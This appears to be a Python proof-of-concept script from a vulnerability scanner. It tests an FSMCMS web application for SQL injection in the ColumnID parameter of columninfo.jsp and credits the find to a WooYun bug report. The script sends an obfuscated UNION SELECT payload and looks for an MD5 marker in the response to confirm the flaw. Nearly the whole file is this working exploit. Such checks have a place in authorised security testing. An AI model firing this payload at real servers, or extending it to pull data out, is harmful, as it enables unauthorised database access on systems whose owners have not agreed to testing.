#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: FSMCMS columninfo.jsp文件参数ColumnID SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2015-0144330
author: Lucifer
description: 文件columninfo.jsp中,参数ColumnID存在SQL注入。
'''
import sys
import requests
import warnings
def run(url):
        result = ['FSMCMS columninfo.jsp文件参数ColumnID SQL注入','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/fsmcms/cms/web/columninfo.jsp?ColumnID=-5/**/UnIoN/**/SeLeCt/**/1,2,Md5(1234),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38%23"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
